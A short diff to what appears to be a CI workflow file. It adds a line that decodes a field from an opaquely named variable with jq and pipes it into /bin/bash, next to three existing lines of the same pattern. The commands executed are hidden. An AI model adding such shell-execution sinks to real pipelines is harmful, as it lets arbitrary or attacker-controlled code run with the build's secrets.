@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$ldqk5361" | jq -r .eo37 | /bin/bash
           echo $bul9517 | jq -r .bc53183 | /bin/bash
           printf '%s' "$ozx29" | jq -r .mht679 | /bin/bash
+          printf '%s' "$nj04850" | jq -r .m1218 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
